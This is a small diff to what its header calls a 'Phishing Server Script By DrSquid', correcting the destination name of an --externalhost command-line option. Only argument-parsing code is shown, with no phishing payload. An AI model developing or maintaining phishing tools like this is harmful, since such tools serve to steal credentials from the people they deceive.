@@ -711,7 +711,7 @@ Phishing Server Script By DrSquid  """)
         args.add_option("--ip", "--ipaddr", dest="ip")
         args.add_option("--p", "--port", dest="p")
         args.add_option("--pl", "--platform", dest="pl")
-        args.add_option("--eh", "--externalhost", dest="ea")
+        args.add_option("--eh", "--externalhost", dest="eh")
         args.add_option("--i", "--info", dest="i", action="store_true")
         arg, opt = args.parse_args()
         if arg.i is not None:
